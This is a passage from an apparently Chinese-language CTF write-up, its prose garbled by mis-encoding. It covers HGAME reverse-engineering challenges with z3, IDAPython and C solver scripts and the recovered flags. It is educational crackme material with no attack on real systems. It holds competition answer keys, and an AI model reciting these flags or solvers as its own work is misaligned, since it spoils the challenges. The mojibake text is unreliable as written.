class="number">0x41D8</span>] = <span class="string">'a'</span>, a[<span class="number">0x18FC</span>] = <span class="string">'m'</span>, a[<span class="number">0xE91A</span>] = <span class="string">'r'</span>, a[<span class="number">0x13F0F</span>] = <span class="string">'I'</span>;</span><br><span class="line">a[<span class="number">0x70B8</span>] = <span class="string">'t'</span>, a[<span class="number">4741</span>] = <span class="string">'m'</span>, a[<span class="number">30778</span>] = <span class="string">' '</span>, a[<span class="number">0xEFA</span>] = <span class="string">'g'</span>;</span><br><span class="line">a[<span class="number">11980</span>] = <span class="string">'q'</span>, a[<span class="number">5130</span>] = <span class="string">'p'</span>, a[<span class="number">0x7F0</span>] = <span class="string">'a'</span>, a[<span class="number">0x13FA7</span>] = <span class="string">'0'</span>;</span><br><span class="line">a[<span class="number">0x4127</span>] = <span class="string">' '</span>, a[<span class="number">0x10D66</span>] = <span class="string">'Q'</span>, a[<span class="number">0x54A</span>] = <span class="string">'O'</span>, a[<span class="number">0xDBA0</span>] = <span class="string">'s'</span>;</span><br><span class="line">a[<span class="number">0x10EE1</span>] = <span class="string">'h'</span>, a[<span class="number">70302</span>] = <span class="string">'x'</span>, a[<span class="number">0x11C08</span>] = <span class="string">'n'</span>, a[<span class="number">0x4831</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0xE33C</span>] = <span class="string">'t'</span>, a[<span class="number">0xFAF4</span>] = <span class="string">' '</span>, a[<span class="number">80538</span>] = <span class="string">'i'</span>, a[<span class="number">0xF4E1</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">22890</span>] = <span class="string">'u'</span>, a[<span class="number">0x803B</span>] = <span class="string">'m'</span>, a[<span class="number">0x655B</span>] = <span class="string">'d'</span>, a[<span class="number">0xDC3A</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x3599</span>] = <span class="string">'o'</span>, a[<span class="number">44072</span>] = <span class="string">'k'</span>, a[<span class="number">0xB205</span>] = <span class="string">'N'</span>, a[<span class="number">0xBB43</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">80939</span>] = <span class="string">'7'</span>, a[<span class="number">0x3F07</span>] = <span class="string">'f'</span>, a[<span class="number">52068</span>] = <span class="string">'o'</span>, a[<span class="number">0xCAA2</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">72519</span>] = <span class="string">'_'</span>, a[<span class="number">0x11F52</span>] = <span class="string">'k'</span>, a[<span class="number">0x3CA5</span>] = <span class="string">'q'</span>, a[<span class="number">75894</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">0xF723</span>] = <span class="string">'e'</span>, a[<span class="number">0x7221</span>] = <span class="string">'u'</span>, a[<span class="number">0x2FCD</span>] = <span class="string">' '</span>, a[<span class="number">3501</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x9168</span>] = <span class="string">'e'</span>, a[<span class="number">0x8DC6</span>] = <span class="string">' '</span>, a[<span class="number">0x100CF</span>] = <span class="string">'s'</span>, a[<span class="number">0xCD51</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">0x10B56</span>] = <span class="string">'d'</span>, a[<span class="number">0x6ABD</span>] = <span class="string">' '</span>, a[<span class="number">0x103F7</span>] = <span class="string">'y'</span>, a[<span class="number">60485</span>] = <span class="string">'x'</span>;</span><br><span class="line">a[<span class="number">0x9589</span>] = <span class="string">'u'</span>, a[<span class="number">0x1105E</span>] = <span class="string">'3'</span>, a[<span class="number">54002</span>] = <span class="string">'b'</span>, a[<span class="number">0x12C3F</span>] = <span class="string">'1'</span>;</span><br><span class="line">a[<span class="number">0x6750</span>] = <span class="string">','</span>, a[<span class="number">0xBFCB</span>] = <span class="string">' '</span>, a[<span class="number">70562</span>] = <span class="string">'_'</span>, a[<span class="number">0xE66F</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">47203</span>] = <span class="string">'q'</span>, a[<span class="number">0x4994</span>] = <span class="string">'f'</span>, a[<span class="number">0xF098</span>] = <span class="string">'s'</span>, a[<span class="number">0xC131</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x16FB</span>] = <span class="string">'g'</span>, a[<span class="number">74919</span>] = <span class="string">'z'</span>, a[<span class="number">0xA96B</span>] = <span class="string">' '</span>, a[<span class="number">0x4558</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x222F</span>] = <span class="string">'z'</span>, a[<span class="number">0xAAD0</span>] = <span class="string">'n'</span>, a[<span class="number">0x9841</span>] = <span class="string">'z'</span>, a[<span class="number">71894</span>] = <span class="string">'3'</span>;</span><br><span class="line">a[<span class="number">0x8AF0</span>] = <span class="string">'s'</span>, a[<span class="number">0x2BFF</span>] = <span class="string">'t'</span>, a[<span class="number">0x525F</span>] = <span class="string">'b'</span>, a[<span class="number">0x9995</span>] = <span class="string">'e'</span>;</span><br><span class="line">a[<span class="number">68035</span>] = <span class="string">'&#123;'</span>, a[<span class="number">0xA375</span>] = <span class="string">'q'</span>, a[<span class="number">10949</span>] = <span class="string">'f'</span>, a[<span class="number">0x63DD</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xA621</span>] = <span class="string">'p'</span>, a[<span class="number">78398</span>] = <span class="string">'_'</span>, a[<span class="number">0x10780</span>] = <span class="string">'q'</span>, a[<span class="number">0x609E</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">9603</span>] = <span class="string">'!'</span>, a[<span class="number">0x7E5F</span>] = <span class="string">'t'</span>, a[<span class="number">0x83C0</span>] = <span class="string">'x'</span>, a[<span class="number">0x8A6D</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x1309A</span>] = <span class="string">'3'</span>, a[<span class="number">0xB8F4</span>] = <span class="string">'O'</span>, a[<span class="number">54430</span>] = <span class="string">'m'</span>, a[<span class="number">0x143CF</span>] = <span class="string">'w'</span>;</span><br><span class="line">a[<span class="number">40499</span>] = <span class="string">'u'</span>, a[<span class="number">0xD882</span>] = <span class="string">'u'</span>, a[<span class="number">0xB5DB</span>] = <span class="string">'f'</span>, a[<span class="number">0x931B</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0x1FB0</span>] = <span class="string">'u'</span>, a[<span class="number">0xF2F2</span>] = <span class="string">' '</span>, a[<span class="number">0x5031</span>] = <span class="string">'m'</span>, a[<span class="number">0x12720</span>] = <span class="string">'4'</span>;</span><br><span class="line">a[<span class="number">0x6649</span>] = <span class="string">'q'</span>, a[<span class="number">0xBCA1</span>] = <span class="string">'R'</span>, a[<span class="number">24004</span>] = <span class="string">' '</span>, a[<span class="number">0x10180</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">77170</span>] = <span class="string">'h'</span>, a[<span class="number">0x7B3C</span>] = <span class="string">'o'</span>, a[<span class="number">3019</span>] = <span class="string">'s'</span>, a[<span class="number">20120</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">74113</span>] = <span class="string">'_'</span>, a[<span class="number">0xDD23</span>] = <span class="string">','</span>, a[<span class="number">58044</span>] = <span class="string">'f'</span>, a[<span class="number">79659</span>] = <span class="string">'z'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xfffffff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i])</span><br><span class="line"><span class="built_in">putchar</span>(a[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<strong>Oazsdgmpgmfuaz! ftq eqodqf ar ftq mbbe ue tqdq, ftue otmxxqzsq ue uzebudqp nk NkfqOFR arrxuzq omybmusz, ftq rxms ue tsmyq{dQh3x_y3_nk_z4F1h3_0d_zi7I0dw}</strong>ï¼Œå¯ä»¥çœ‹åˆ°æœ€åå’Œflagçš„æ ¼å¼æ˜¯ä¸€æ ·çš„äº†ï¼Œå­—ç¬¦æ•°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²çš„ç‰¹å¾çŒœæµ‹å‡¯æ’’åŠ å¯†ã€‚</p><p>ä»ä½ç§»12å¾—åˆ°ç»“æœï¼š</p><p><img src="https://i.loli.net/2021/02/27/ruso9GQJk7PqxYE.png" alt="image-20210227112643799"></p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>å¼€å§‹æ²¡æ³¨æ„ï¼Œä»¥ä¸ºå°±æ˜¯è€ƒä¸‹z3çš„ä½¿ç”¨ï¼Œä¸”é¢˜ç›®ä¸­æœ‰æç¤ºï¼š<strong>Try angr or z3.</strong>ï¼Œä¸Šæ¥å°±æŠŠ36ä¸ªæ–¹ç¨‹ç»„å»å†™z3ï¼Œæ²¡æœ‰å‘ç°è§£ã€‚ã€‚ä¹Ÿå¯èƒ½æ˜¯æˆ‘çš„çº¦æŸæ¡ä»¶å†™é”™äº†ã€‚ã€‚</p><p>ä¹‹åæ³¨æ„åˆ°é¢˜ç›®åå­—fakeï¼Œè¿›è€Œçœ‹äº†çœ‹ç¨‹åºï¼Œå‘ç°ä¸€ä¸ªè·å–TracerPidçš„åè°ƒè¯•å’Œç´§æ¥ç€çš„smcï¼š</p><p><img src="https://i.loli.net/2021/02/27/UxcMZYkvEy4TsDh.png" alt="image-20210217162653310"></p><p>è‡ªå·±æŸ¥çœ‹ä¸€ä¸‹éè°ƒè¯•è¿è¡Œæ—¶çš„çŠ¶æ€ï¼š<br><img src="https://i.loli.net/2021/02/27/rS7LQ2zW3DjHcZx.png" alt="image-20210217162839393"></p><p>ä½¿ç”¨idapythonæˆ–è°ƒè¯•åˆ°smcåçš„ä»£ç ï¼Œå…¶å®å°±æ˜¯2ä¸ªçŸ©é˜µçš„ä¹˜æ³•ï¼š</p><p><img src="https://i.loli.net/2021/02/27/VhjmxeSoF9OPayk.png" alt="image-20210217163037584"></p><p>å…ˆz3è§£ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">'flag[%d]'</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">104</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">123</span>, <span class="number">64</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">83</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">55030</span>, <span class="number">61095</span>, <span class="number">60151</span>, <span class="number">57247</span>, <span class="number">56780</span>, <span class="number">55726</span>, <span class="number">46642</span>, <span class="number">52931</span>, <span class="number">53580</span>, <span class="number">50437</span>, <span class="number">50062</span>, <span class="number">44186</span>, <span class="number">44909</span>, <span class="number">46490</span>, <span class="number">46024</span>, <span class="number">44347</span>, <span class="number">43850</span>, <span class="number">44368</span>, <span class="number">54990</span>, <span class="number">61884</span>, <span class="number">61202</span>, <span class="number">58139</span>, <span class="number">57730</span>, <span class="number">54964</span>, <span class="number">48849</span>, <span class="number">51026</span>, <span class="number">49629</span>, <span class="number">48219</span>, <span class="number">47904</span>, <span class="number">50823</span>, <span class="number">46596</span>, <span class="number">50517</span>, <span class="number">48421</span>, <span class="number">46143</span>, <span class="number">46102</span>, <span class="number">46744</span>]</span><br><span class="line">ans = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">ans[<span class="number">6</span>*i+j] += a[<span class="number">6</span>*k+j] * flag[<span class="number">6</span>*i+k]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">s.add(b[<span class="number">6</span>*i+j] == ans[<span class="number">6</span>*i+j])</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">flag = [s.model()[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">print(bytes(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"unsat"</span>)</span><br><span class="line"><span class="comment">#hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨sageæ±‚è§£çœ‹ï¼Œå®è´¨å°±æ˜¯å…ˆæ±‚å¾—ä¸€ä¸ªé€†çŸ©é˜µç„¶åä¸encç»„æˆçš„çŸ©é˜µåšä¹˜æ³•ã€‚</p><p><img src="https://i.loli.net/2021/02/27/hPdyLxSuDFpTRZE.png" alt="image-20210217163948621"></p><h3 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h3><p>ä¸€è¡€ã€‚</p><p>å¼€å§‹æ¯ç®¡é¢˜ç›®çš„æç¤ºä¿¡æ¯ï¼Œç›´æ¥é™æ€åˆ†æäº†ä¸‹ï¼Œçœ‹è§åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œåé¢å¼€å§‹æ³¨å†Œçª—å£å„ç§æ“ä½œï¼Œç„¶åè¶Šçœ‹è¶Šå¤æ‚ï¼Œå®šä½åˆ°è¿™ä¸ªå‡½æ•°ï¼Œæœ‰ivï¼Œkeyå’ŒåŠ å¯†è§£å¯†æ“ä½œï¼Œä»å¸¸é‡è¯†åˆ«å‡ºæ˜¯teaç±»çš„åŠ å¯†ç®—æ³•ï¼Ÿä½†è¿™ä¸ªä¹Ÿæ— ä»ä¸‹æ‰‹ï¼Œç¨‹åºä¸­å¥½åƒæ²¡è°ƒç”¨è¿™é‡Œã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/27/gdX7jNlDYhB2fJv.png" alt="image-20210217164757847"></p><p>å—¯ï¼Œï¼Œå›åˆ°é¢˜ç›®å¼€å§‹çœ‹æç¤ºä¿¡æ¯ï¼šå¼€å‘è€…ç•™ä¸‹äº†è°ƒè¯•ä¿¡æ¯ï¼Œè¯•è¯•DbgViewã€‚å°±è¯•è¯•å§ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œæ¯æ¬¡è¾“å…¥éƒ½ä¼šè¾“å‡ºç›¸åº”çš„å“åº”ï¼š</p><p><img src="https://i.loli.net/2021/02/27/6AUTcPakH9fLeiq.png" alt="image-20210217165042094"></p><p>è¿™é‡Œæˆ‘ç›´æ¥å»å®šä½input lengthï¼Œå› ä¸ºä¹‹å‰é™æ€åˆ†ææ—¶çœ‹è§è¿‡ã€‚</p><p><img src="https://i.loli.net/2021/02/27/vicGJT4f5utmgY9.png" alt="image-20210217165253173"></p><p>å…¶å®ä¸Šé¢è¿™ä¸ªæ•´ä¸ªå‡½æ•°å°±æ˜¯å…³é”®äº†ï¼Œç®€å•çœ‹ä¸‹æ±‡ç¼–ï¼Œç»“åˆDbgViewã€‚</p><p>è¾“å…¥é•¿åº¦ä¸º20ï¼Œæ¯ä¸€ä½å…ˆå’Œ0xffè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œæœ€åæ¥ä¸ªrc4åŠ å¯†å†å’Œå¯†æ–‡æ¯”è¾ƒã€‚<strong>æ³¨æ„ï¼šè¾“å…¥çš„æ˜¯æ¯ä¸ªå­—ç¬¦çš„orderå€¼ï¼Œä»DbgViewå¯ä»¥æŸ¥çœ‹ã€‚</strong></p><p>æˆ‘ç›´æ¥é™„åŠ è°ƒè¯•å¾—åˆ°å†…å­˜ä¿¡æ¯ï¼Œç„¶åidapythonå¾—åˆ°orderå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x7FF7E35B5820</span></span><br><span class="line">addr1 = <span class="number">0x07FF7E35A3720</span></span><br><span class="line">flag = []</span><br><span class="line">s = [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>]</span><br><span class="line">s = [i^<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag += [(s[i]^get_byte(addr) ^ get_byte(addr1)) ^<span class="number">0xff</span>]</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">    addr1 += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>æœ€åç”¨Cè¯­è¨€å†™ä¸€ä¸ªç½®è¡¨å¾—åˆ°è¾“å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">59</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">72</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">26</span>, <span class="number">31</span>,</span><br><span class="line"> <span class="number">61</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">23</span>,</span><br><span class="line">  <span class="number">68</span>, <span class="number">24</span>, <span class="number">41</span>, <span class="number">48</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> s1[] = <span class="string">"1234567890-+"</span>;</span><br><span class="line"><span class="keyword">char</span> s2[] = <span class="string">"QWERTYUIOP&#123;&#125;|"</span>;</span><br><span class="line"><span class="keyword">char</span> s3[] = <span class="string">"ASDFGHJKL;'"</span>;</span><br><span class="line"><span class="keyword">char</span> s4[] = <span class="string">"ZXCVBNM,./"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">50</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">21</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">b[i] = s1[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">37</span>; i &lt;= <span class="number">49</span>; i++)</span><br><span class="line">b[i] = s2[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">54</span>; i &lt;= <span class="number">64</span>; i++)</span><br><span class="line">b[i] = s3[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">66</span>; i &lt;= <span class="number">75</span>; i++)</span><br><span class="line">b[i] = s4[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">flag[i] = b[a[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//HGAME&#123;6-K4K.4R+3C4T&#125;</span></span><br></pre></td></tr></table></figure><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>äºŒè¡€ã€‚</p><p>ä¸€ä¸ªç®€å•çš„vmï¼Œè°ƒè¯•è·Ÿè¸ªå¾—åˆ°å…ˆæ˜¯æ‰¾åˆ°è¾“å…¥çš„æœ€åä¸€ä½ï¼Œå¼€å§‹ä»åå‘å‰è¿›è¡ŒæŒ‡å®šå€¼çš„å¼‚æˆ–è¿ç®—ï¼Œç´§æ¥ç€ä¸€è½®ä»åå‘å‰çš„å‡æ³•è¿ç®—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">207</span>, <span class="number">191</span>, <span class="number">128</span>,  <span class="number">59</span>, <span class="number">246</span>, <span class="number">175</span>, <span class="number">126</span>,   <span class="number">2</span>,  <span class="number">36</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">112</span>,  <span class="number">58</span>, <span class="number">244</span>, <span class="number">235</span>, <span class="number">122</span>,  <span class="number">74</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">162</span>, <span class="number">103</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">240</span>, <span class="number">198</span>, <span class="number">118</span>,  <span class="number">54</span>, <span class="number">232</span>, <span class="number">173</span>, <span class="number">130</span>,  <span class="number">46</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">183</span>,  <span class="number">79</span>, <span class="number">230</span>,   <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = <span class="number">0xfe</span>, b = <span class="number">0x7a</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] += b;</span><br><span class="line">b -= <span class="number">0x60</span>;</span><br><span class="line">enc[i] ^= a;</span><br><span class="line">a += <span class="number">0x23</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h3><p>ä¸€ä¸ªæ‰«é›·æ¸¸æˆï¼Œç¬¬ä¸€æ­¥æ“ä½œåï¼Œå¦‚æœåé¢æ—¶é—´è¶…è¿‡5sçš„è¯æ¸¸æˆç»“æŸã€‚è¿™ä¸ªä¿®æ”¹ä¸‹ç³»ç»Ÿæ—¶é—´å°±è§£é™¤äº†ã€‚</p><p>æ‰¾åˆ°å…³é”®æ•°æ®æ–‡ä»¶å¤¹ï¼š</p><p><img src="https://i.loli.net/2021/02/27/oezlBwiY5mTZuOA.png" alt="image-20210227114208257"></p><p>åç¼–è¯‘AFiveSecondChallenge.dllï¼šçœ‹åˆ°è·å–å½“å‰ç³»ç»Ÿçš„æ—¶é—´ï¼Œæ£€æŸ¥æ˜¯å¦è¶…æ—¶çš„å‡½æ•°ï¼Œé¢˜ç›®æè¿°çš„ä¸€æ ·ï¼Œå¯¹dllåšäº†æ‰‹è„šï¼Œä¹Ÿæ˜¯<strong>CheckBomAt</strong>è¿™ä¸ªå‡½æ•°ï¼Œæœ€åæœ‰å¾ˆå¤šæ•°æ®ï¼Œä»æ•°é‡å¯ä»¥çŒœæµ‹å¯¹åº”æˆ‘ä»¬é¢˜ç›®ä¸­çš„45*45çš„æ ¼å­ã€‚</p><p><img src="https://i.loli.net/2021/02/27/CyHbQdXat52eZkR.png" alt="image-20210227114516330"></p><p>ç°åœ¨ç›®çš„å°±æ˜¯æ‰¾<strong>CheckBomAt</strong>å‡½æ•°ï¼Œå¼€å§‹æƒ³çš„æ˜¯å¯èƒ½æœ‰åŠæ³•ä¿®å¤è¿™ä¸ªdllï¼Œæœç´¢ä¸€ç•ªæ²¡æœ‰ç»“æœã€‚</p><p>è½¬åˆ°åˆšåˆšé‚£ä¸ªæ–‡ä»¶å¤¹çš„ï¼Œå‘ç°2ä¸ªå…³é”®cppæ–‡ä»¶ï¼šAFiveSecondChallenge.cppï¼ŒAssembly-CSharp.cppã€‚</p><p>åœ¨AFiveSecondChallenge.cppä¸­å‘ç°åç¼–è¯‘ä¸å‡ºæ¥çš„å‡½æ•°ï¼šä»åå­—å¯ä»¥å¾ˆå¥½è¯†åˆ«å…¶åŠŸèƒ½ï¼Œå¼€å§‹åšä¸€ä¸ªè¶…æ—¶æ£€æŸ¥ï¼Œå¦‚æœæ²¡è¶…æ—¶å–å‡ºmatrixä¸­çš„æ•°æ®åšä¸€ä¸ªè¿ç®—ååˆ¤æ–­ã€‚</p><p><img src="https://i.loli.net/2021/02/27/NdvUQpMXrFontj9.png" alt="image-20210227120034686"></p><p>ç„¶åä»Assembly-CSharp.cppä¸­çœ‹åˆ°äº†æ•´ä¸ªæ¸¸æˆé€»è¾‘ã€‚æ³¨é‡Šç›¸å½“äºæŠŠæºç éƒ½ç»™äº†å§ï¼ŒçœŸå¥½ã€‚</p><p>æ•æ‰é¼ æ ‡ç‚¹å‡»åï¼Œå¼€å§‹è¿›è¡Œå„ç§åˆ¤æ–­ã€‚</p><p><img src="https://i.loli.net/2021/02/27/4rOwLYtVzcUlDmf.png" alt="image-20210227120525813"></p><p>è®¡ç®—å‘¨å›´çš„é›·æ•°ï¼Œå°±æ˜¯åˆ¤æ–­8ä¸ªæ–¹å‘ï¼Œä¹Ÿå¯ä»¥çœ‹å‡ºè¿”å›å€¼ä¸º0ä»£è¡¨ä¸æ˜¯é›·ï¼š</p><p><img 